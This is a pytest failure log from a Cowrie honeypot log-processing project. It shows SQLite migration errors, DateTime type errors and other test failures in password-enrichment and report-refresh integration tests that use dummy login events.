2025-10-18 17:40:21,276:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
2025-10-18 17:40:21,277:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Snowshoe detection schema migration (v8) completed successfully
------------------------------ Captured log call -------------------------------
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Set default source_generation values
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Create unique index on raw_events
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate session_id from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_type from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:35 Successfully executed: Populate event_timestamp from JSON (SQLite)
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:317 SQLite boolean defaults for files.vt_malicious will be set on next schema creation
INFO     cowrieprocessor.db.migrations:migrations.py:418 Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
INFO     cowrieprocessor.db.migrations:migrations.py:683 Starting snowshoe detection schema migration (v8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_detection_time index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_window index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_confidence index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_likely index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
ERROR    cowrieprocessor.db.migrations:migrations.py:38 Failed to execute SQL: Create ix_snowshoe_detections_created index - Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.
INFO     cowrieprocessor.db.migrations:migrations.py:725 Snowshoe detection schema migration (v8) completed successfully
_____________________ test_end_to_end_password_enrichment ______________________

self = <sqlalchemy.engine.base.Connection object at 0x7756b2782cf0>
dialect = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b27634d0>
constructor = <bound method DefaultExecutionContext._init_compiled of <class 'sqlalchemy.dialects.sqlite.base.SQLiteExecutionContext'>>
statement = <sqlalchemy.dialects.sqlite.base.SQLiteCompiler object at 0x7756b30ca850>
parameters = [{'event_timestamp': '2025-10-18T17:40:24.267051+00:00', 'event_type': 'cowrie.session.connect', 'id': 1, 'ingest_id':...timestamp': '2025-10-18T17:40:24.267286+00:00', 'event_type': 'cowrie.login.success', 'id': 3, 'ingest_id': None, ...}]
execution_options = immutabledict({'compiled_cache': <sqlalchemy.util._collections.LRUCache object at 0x7756b2de1710>})
args = (<sqlalchemy.dialects.sqlite.base.SQLiteCompiler object at 0x7756b30ca850>, [{'event_timestamp': '2025-10-18T17:40:24....': 'cowrie.login.success', 'id': 3, 'ingest_id': None, ...}], <sqlalchemy.sql.dml.Insert object at 0x7756b2e0f0e0>, [])
kw = {'cache_hit': <CacheStats.CACHE_MISS: 1>}, yp = None
conn = <sqlalchemy.pool.base._ConnectionFairy object at 0x7756b2123290>

    def _execute_context(
        self,
        dialect: Dialect,
        constructor: Callable[..., ExecutionContext],
        statement: Union[str, Compiled],
        parameters: Optional[_AnyMultiExecuteParams],
        execution_options: _ExecuteOptions,
        *args: Any,
        **kw: Any,
    ) -> CursorResult[Any]:
        """Create an :class:`.ExecutionContext` and execute, returning
        a :class:`_engine.CursorResult`."""
    
        if execution_options:
            yp = execution_options.get("yield_per", None)
            if yp:
                execution_options = execution_options.union(
                    {"stream_results": True, "max_row_buffer": yp}
                )
        try:
            conn = self._dbapi_connection
            if conn is None:
                conn = self._revalidate_connection()
    
>           context = constructor(
                dialect, self, conn, execution_options, *args, **kw
            )

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1815: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/default.py:1493: in _init_compiled
    flattened_processors[key](compiled_params[key])
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

value = '2025-10-18T17:40:24.267051+00:00'

    def process(value):
        if value is None:
            return None
        elif isinstance(value, datetime_datetime):
            return format_ % {
                "year": value.year,
                "month": value.month,
                "day": value.day,
                "hour": value.hour,
                "minute": value.minute,
                "second": value.second,
                "microsecond": value.microsecond,
            }
        elif isinstance(value, datetime_date):
            return format_ % {
                "year": value.year,
                "month": value.month,
                "day": value.day,
                "hour": 0,
                "minute": 0,
                "second": 0,
                "microsecond": 0,
            }
        else:
>           raise TypeError(
                "SQLite DateTime type only accepts Python "
                "datetime and date objects as input."
            )
E           TypeError: SQLite DateTime type only accepts Python datetime and date objects as input.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/dialects/sqlite/base.py:1195: TypeError

The above exception was the direct cause of the following exception:

test_db = sessionmaker(class_='Session', bind=Engine(sqlite:////tmp/tmpkhz7kd42/test.db), autoflush=True, expire_on_commit=True)
cache_manager = EnrichmentCacheManager(base_dir=PosixPath('/tmp/tmpkhz7kd42/cache'), ttls={'virustotal': 2592000, 'virustotal_unknown'..., 'dshield': 604800, 'urlhaus': 259200, 'spur': 1209600, 'hibp': 5184000}, stats={'hits': 0, 'misses': 0, 'stores': 0})
mock_rate_limiter = <Mock spec='RateLimitedSession' id='131214247169392'>

    @pytest.mark.integration
    def test_end_to_end_password_enrichment(test_db, cache_manager, mock_rate_limiter) -> None:
        """Test complete password enrichment workflow."""
        # Create test data
        session_id = "test123"
    
        with test_db() as db_session:
            # Create session and events
            session_summary = create_test_session(session_id)
            db_session.add(session_summary)
    
            # Create login events with passwords
            events = [
                create_test_event(1, session_id, 'cowrie.session.connect', {'src_ip': '1.2.3.4', 'protocol': 'ssh'}),
                create_test_event(2, session_id, 'cowrie.login.failed', {'username': 'root', 'password': 'password123'}),
                create_test_event(3, session_id, 'cowrie.login.success', {'username': 'root', 'password': 'admin'}),
            ]
            for event in events:
                db_session.add(event)
    
>           db_session.commit()

/home/speterson/cowrieprocessor/tests/integration/test_password_enrichment.py:101: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:2032: in commit
    trans.commit(_to_root=True)
<string>:2: in commit
    ???
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/state_changes.py:137: in _go
    ret_value = fn(self, *arg, **kw)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:1313: in commit
    self._prepare_impl()
<string>:2: in _prepare_impl
    ???
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/state_changes.py:137: in _go
    ret_value = fn(self, *arg, **kw)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:1288: in _prepare_impl
    self.session.flush()
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:4345: in flush
    self._flush(objects)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:4480: in _flush
    with util.safe_reraise():
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/util/langhelpers.py:224: in __exit__
    raise exc_value.with_traceback(exc_tb)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:4441: in _flush
    flush_context.execute()
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/unitofwork.py:466: in execute
    rec.execute(self)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/unitofwork.py:642: in execute
    util.preloaded.orm_persistence.save_obj(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/persistence.py:93: in save_obj
    _emit_insert_statements(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/persistence.py:1143: in _emit_insert_statements
    result = connection.execute(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1821: in _execute_context
    self._handle_dbapi_exception(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:2355: in _handle_dbapi_exception
    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1815: in _execute_context
    context = constructor(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/default.py:1493: in _init_compiled
    flattened_processors[key](compiled_params[key])
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

value = '2025-10-18T17:40:24.267051+00:00'

    def process(value):
        if value is None:
            return None
        elif isinstance(value, datetime_datetime):
            return format_ % {
                "year": value.year,
                "month": value.month,
                "day": value.day,
                "hour": value.hour,
                "minute": value.minute,
                "second": value.second,
                "microsecond": value.microsecond,
            }
        elif isinstance(value, datetime_date):
            return format_ % {
                "year": value.year,
                "month": value.month,
                "day": value.day,
                "hour": 0,
                "minute": 0,
                "second": 0,
                "microsecond": 0,
            }
        else:
>           raise TypeError(
                "SQLite DateTime type only accepts Python "
                "datetime and date objects as input."
            )
E           sqlalchemy.exc.StatementError: (builtins.TypeError) SQLite DateTime type only accepts Python datetime and date objects as input.
E           [SQL: INSERT INTO raw_events (id, ingest_id, source, source_offset, source_inode, payload, payload_hash, risk_score, session_id, event_type, event_timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) RETURNING id, ingest_at, source_generation, quarantined]
E           [parameters: [{'payload': {'src_ip': '1.2.3.4', 'protocol': 'ssh'}, 'session_id': 'test123', 'event_type': 'cowrie.session.connect', 'id': 1, 'source': '/tmp/test_t ... (24 characters truncated) ... estamp': '2025-10-18T17:40:24.267051+00:00', 'risk_score': None, 'payload_hash': None, 'ingest_id': None, 'source_offset': None, 'source_inode': None}, {'payload': {'username': 'root', 'password': 'password123'}, 'session_id': 'test123', 'event_type': 'cowrie.login.failed', 'id': 2, 'source': '/tmp/te ... (28 characters truncated) ... estamp': '2025-10-18T17:40:24.267212+00:00', 'risk_score': None, 'payload_hash': None, 'ingest_id': None, 'source_offset': None, 'source_inode': None}, {'payload': {'username': 'root', 'password': 'admin'}, 'session_id': 'test123', 'event_type': 'cowrie.login.success', 'id': 3, 'source': '/tmp/test_te ... (23 characters truncated) ... estamp': '2025-10-18T17:40:24.267286+00:00', 'risk_score': None, 'payload_hash': None, 'ingest_id': None, 'source_offset': None, 'source_inode': None}]]

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/dialects/sqlite/base.py:1195: StatementError
_________________________ test_novel_password_tracking _________________________

self = <sqlalchemy.engine.base.Connection object at 0x7756b23c4130>
dialect = <sqlalchemy.dialects.sqlite.pysqlite.SQLiteDialect_pysqlite object at 0x7756b30ca210>
constructor = <bound method DefaultExecutionContext._init_compiled of <class 'sqlalchemy.dialects.sqlite.base.SQLiteExecutionContext'>>
statement = <sqlalchemy.dialects.sqlite.base.SQLiteCompiler object at 0x7756b28fd810>
parameters = [{'event_timestamp': '2025-10-18T17:40:34.225251+00:00', 'event_type': 'cowrie.login.failed', 'id': 1, 'ingest_id': No..._timestamp': '2025-10-18T17:40:34.225362+00:00', 'event_type': 'cowrie.login.failed', 'id': 2, 'ingest_id': None, ...}]
execution_options = immutabledict({'compiled_cache': <sqlalchemy.util._collections.LRUCache object at 0x7756b2de1710>})
args = (<sqlalchemy.dialects.sqlite.base.SQLiteCompiler object at 0x7756b28fd810>, [{'event_timestamp': '2025-10-18T17:40:34....e': 'cowrie.login.failed', 'id': 2, 'ingest_id': None, ...}], <sqlalchemy.sql.dml.Insert object at 0x7756b033f310>, [])
kw = {'cache_hit': <CacheStats.CACHE_MISS: 1>}, yp = None
conn = <sqlalchemy.pool.base._ConnectionFairy object at 0x7756b0bc17f0>

    def _execute_context(
        self,
        dialect: Dialect,
        constructor: Callable[..., ExecutionContext],
        statement: Union[str, Compiled],
        parameters: Optional[_AnyMultiExecuteParams],
        execution_options: _ExecuteOptions,
        *args: Any,
        **kw: Any,
    ) -> CursorResult[Any]:
        """Create an :class:`.ExecutionContext` and execute, returning
        a :class:`_engine.CursorResult`."""
    
        if execution_options:
            yp = execution_options.get("yield_per", None)
            if yp:
                execution_options = execution_options.union(
                    {"stream_results": True, "max_row_buffer": yp}
                )
        try:
            conn = self._dbapi_connection
            if conn is None:
                conn = self._revalidate_connection()
    
>           context = constructor(
                dialect, self, conn, execution_options, *args, **kw
            )

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1815: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/default.py:1493: in _init_compiled
    flattened_processors[key](compiled_params[key])
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

value = '2025-10-18T17:40:34.225251+00:00'

    def process(value):
        if value is None:
            return None
        elif isinstance(value, datetime_datetime):
            return format_ % {
                "year": value.year,
                "month": value.month,
                "day": value.day,
                "hour": value.hour,
                "minute": value.minute,
                "second": value.second,
                "microsecond": value.microsecond,
            }
        elif isinstance(value, datetime_date):
            return format_ % {
                "year": value.year,
                "month": value.month,
                "day": value.day,
                "hour": 0,
                "minute": 0,
                "second": 0,
                "microsecond": 0,
            }
        else:
>           raise TypeError(
                "SQLite DateTime type only accepts Python "
                "datetime and date objects as input."
            )
E           TypeError: SQLite DateTime type only accepts Python datetime and date objects as input.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/dialects/sqlite/base.py:1195: TypeError

The above exception was the direct cause of the following exception:

test_db = sessionmaker(class_='Session', bind=Engine(sqlite:////tmp/tmpxs3gguam/test.db), autoflush=True, expire_on_commit=True)
cache_manager = EnrichmentCacheManager(base_dir=PosixPath('/tmp/tmpxs3gguam/cache'), ttls={'virustotal': 2592000, 'virustotal_unknown'..., 'dshield': 604800, 'urlhaus': 259200, 'spur': 1209600, 'hibp': 5184000}, stats={'hits': 0, 'misses': 0, 'stores': 0})
mock_rate_limiter = <Mock spec='RateLimitedSession' id='131214247167712'>

    @pytest.mark.integration
    def test_novel_password_tracking(test_db, cache_manager, mock_rate_limiter) -> None:
        """Test tracking of novel (non-breached) passwords."""
        session_id = "novel_test"
    
        with test_db() as db_session:
            # Create session and events
            session_summary = create_test_session(session_id)
            db_session.add(session_summary)
    
            # Create events with mix of breached and novel passwords
            events = [
                create_test_event(1, session_id, 'cowrie.login.failed', {'username': 'root', 'password': 'breached_pass'}),
                create_test_event(
                    2, session_id, 'cowrie.login.failed', {'username': 'admin', 'password': 'novel_pass_12345'}
                ),
            ]
            for event in events:
                db_session.add(event)
>           db_session.commit()

/home/speterson/cowrieprocessor/tests/integration/test_password_enrichment.py:307: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:2032: in commit
    trans.commit(_to_root=True)
<string>:2: in commit
    ???
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/state_changes.py:137: in _go
    ret_value = fn(self, *arg, **kw)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:1313: in commit
    self._prepare_impl()
<string>:2: in _prepare_impl
    ???
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/state_changes.py:137: in _go
    ret_value = fn(self, *arg, **kw)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:1288: in _prepare_impl
    self.session.flush()
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:4345: in flush
    self._flush(objects)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:4480: in _flush
    with util.safe_reraise():
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/util/langhelpers.py:224: in __exit__
    raise exc_value.with_traceback(exc_tb)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/session.py:4441: in _flush
    flush_context.execute()
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/unitofwork.py:466: in execute
    rec.execute(self)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/unitofwork.py:642: in execute
    util.preloaded.orm_persistence.save_obj(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/persistence.py:93: in save_obj
    _emit_insert_statements(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/orm/persistence.py:1143: in _emit_insert_statements
    result = connection.execute(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1821: in _execute_context
    self._handle_dbapi_exception(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:2355: in _handle_dbapi_exception
    raise sqlalchemy_exception.with_traceback(exc_info[2]) from e
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1815: in _execute_context
    context = constructor(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/default.py:1493: in _init_compiled
    flattened_processors[key](compiled_params[key])
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

value = '2025-10-18T17:40:34.225251+00:00'

    def process(value):
        if value is None:
            return None
        elif isinstance(value, datetime_datetime):
            return format_ % {
                "year": value.year,
                "month": value.month,
                "day": value.day,
                "hour": value.hour,
                "minute": value.minute,
                "second": value.second,
                "microsecond": value.microsecond,
            }
        elif isinstance(value, datetime_date):
            return format_ % {
                "year": value.year,
                "month": value.month,
                "day": value.day,
                "hour": 0,
                "minute": 0,
                "second": 0,
                "microsecond": 0,
            }
        else:
>           raise TypeError(
                "SQLite DateTime type only accepts Python "
                "datetime and date objects as input."
            )
E           sqlalchemy.exc.StatementError: (builtins.TypeError) SQLite DateTime type only accepts Python datetime and date objects as input.
E           [SQL: INSERT INTO raw_events (id, ingest_id, source, source_offset, source_inode, payload, payload_hash, risk_score, session_id, event_type, event_timestamp) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?) RETURNING id, ingest_at, source_generation, quarantined]
E           [parameters: [{'payload': {'username': 'root', 'password': 'breached_pass'}, 'session_id': 'novel_test', 'event_type': 'cowrie.login.failed', 'id': 1, 'source': '/t ... (36 characters truncated) ... estamp': '2025-10-18T17:40:34.225251+00:00', 'risk_score': None, 'payload_hash': None, 'ingest_id': None, 'source_offset': None, 'source_inode': None}, {'payload': {'username': 'admin', 'password': 'novel_pass_12345'}, 'session_id': 'novel_test', 'event_type': 'cowrie.login.failed', 'id': 2, 'source': ... (40 characters truncated) ... estamp': '2025-10-18T17:40:34.225362+00:00', 'risk_score': None, 'payload_hash': None, 'ingest_id': None, 'source_offset': None, 'source_inode': None}]]

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/dialects/sqlite/base.py:1195: StatementError
_____ TestRefreshCacheIntegration.test_refresher_seed_missing_integration ______

self = <test_refresh_cache_sqlalchemy2.TestRefreshCacheIntegration object at 0x7756b43f0bb0>

    def test_refresher_seed_missing_integration(self) -> None:
        """Test Refresher.seed_missing integration."""
        # Test that the method can be called with proper arguments
        with tempfile.NamedTemporaryFile(delete=False) as f:
            db_path = f.name
    
        try:
            import sqlite3
            conn = sqlite3.connect(db_path)
            ensure_indicator_table(conn)
    
            # Create files table
            conn.execute('CREATE TABLE IF NOT EXISTS files(hash text, source_ip text)')
            conn.execute('CREATE TABLE IF NOT EXISTS sessions(source_ip text)')
            conn.commit()
    
            # Mock args
            args = Mock()
    
            refresher = Refresher(args, conn)
>           refresher.seed_missing()

/home/speterson/cowrieprocessor/tests/integration/test_refresh_cache_sqlalchemy2.py:357: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <refresh_cache_and_reports.Refresher object at 0x7756b30f3c50>

    def seed_missing(self) -> None:
        """Seed cache with DB-observed hashes and IPs missing from cache."""
        # Seed missing VT hashes from files table
        cur = self.conn.cursor()
        cur.execute('''SELECT DISTINCT hash FROM files WHERE hash IS NOT NULL AND hash != '' ''')
        hashes = [row['hash'] for row in cur.fetchall()]
        for h in hashes:
            if not self.cache_get('vt_file', h):
                self.refresh_vt(h)
    
        # Seed IPs from sessions/files
        cur.execute("SELECT DISTINCT source_ip as ip FROM sessions WHERE source_ip IS NOT NULL AND source_ip != ''")
        ips = {row['ip'] for row in cur.fetchall()}
>       cur.execute("SELECT DISTINCT src_ip as ip FROM files WHERE src_ip IS NOT NULL AND src_ip != ''")
E       sqlite3.OperationalError: no such column: src_ip

/home/speterson/cowrieprocessor/refresh_cache_and_reports.py:255: OperationalError
_________ TestRefreshCacheIntegration.test_refresh_reports_integration _________

self = <test_refresh_cache_sqlalchemy2.TestRefreshCacheIntegration object at 0x7756b43d87d0>

    def test_refresh_reports_integration(self) -> None:
        """Test refresh_reports function integration."""
        # Test that the function can be called with proper arguments
        with tempfile.NamedTemporaryFile(delete=False) as f:
            db_path = f.name
    
        try:
            # Mock args
            args = Mock()
            args.refresh_reports = "all"
            args.hot_daily_days = 7
            args.hot_weekly_weeks = 4
            args.hot_monthly_months = 3
    
            # Mock subprocess.run
            with patch('subprocess.run') as mock_run:
>               refresh_reports(db_path, args)

/home/speterson/cowrieprocessor/tests/integration/test_refresh_cache_sqlalchemy2.py:397: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

db_path = '/tmp/tmpsg6mx49i', args = <Mock id='131214247173760'>

    def refresh_reports(db_path: str, args: argparse.Namespace) -> None:
        """Rebuild recent daily/weekly/monthly reports within hot windows."""
        # Daily for last N days
        if args.refresh_reports in ('all', 'daily'):
            for i in range(args.hot_daily_days):
                date_str = (datetime.utcnow() - timedelta(days=i)).strftime('%Y-%m-%d')
                subprocess.run(
                    [
                        sys.executable,
                        '-m',
                        'cowrieprocessor.cli.report',
                        'daily',
                        date_str,
                        '--all-sensors',
                        '--db',
                        db_path,
                        '--publish',
                    ],
                    check=False,
                )
    
        # Weekly covering last hot_weekly_days
        if args.refresh_reports in ('all', 'weekly'):
>           start = datetime.utcnow() - timedelta(days=args.hot_weekly_days - 1)
E           TypeError: unsupported operand type(s) for -: 'Mock' and 'int'

/home/speterson/cowrieprocessor/refresh_cache_and_reports.py:317: TypeError
________ TestRefreshCacheIntegration.test_type_annotations_consistency _________

self = <test_refresh_cache_sqlalchemy2.TestRefreshCacheIntegration object at 0x7756b43cda70>

    def test_type_annotations_consistency(self) -> None:
        """Test that type annotations are consistent across the module."""
        import inspect
        import refresh_cache_and_reports
    
        # Get all functions from the module
        functions = [getattr(refresh_cache_and_reports, name) for name in dir(refresh_cache_and_reports)
                    if callable(getattr(refresh_cache_and_reports, name)) and not name.startswith('_')]
    
        for func in functions:
            if hasattr(func, '__annotations__'):
                # Check that return type is annotated
                if 'return' not in func.__annotations__:
                    # Skip if it's a builtin or imported function
                    if func.__module__ == 'refresh_cache_and_reports':
>                       assert 'return' in func.__annotations__, f"Function {func.__name__} missing return type annotation"
E                       AssertionError: Function Refresher missing return type annotation
E                       assert 'return' in {}
E                        +  where {} = <class 'refresh_cache_and_reports.Refresher'>.__annotations__

/home/speterson/cowrieprocessor/tests/integration/test_refresh_cache_sqlalchemy2.py:443: AssertionError
________ TestReportingQueries.test_session_stats_with_json_abstraction _________

self = <test_reporting_queries.TestReportingQueries object at 0x7756b43d1590>

    def test_session_stats_with_json_abstraction(self) -> None:
        """Test session statistics using JSON abstraction layer."""
        with tempfile.NamedTemporaryFile(suffix=".sqlite", delete=False) as tmp_file:
            db_path = tmp_file.name
    
        try:
            # Create database and apply migrations
            settings = DatabaseSettings(url=f"sqlite:///{db_path}")
            engine = create_engine_from_settings(settings)
>           apply_migrations(engine)

/home/speterson/cowrieprocessor/tests/integration/test_reporting_queries.py:31: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x7756b30ade10>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
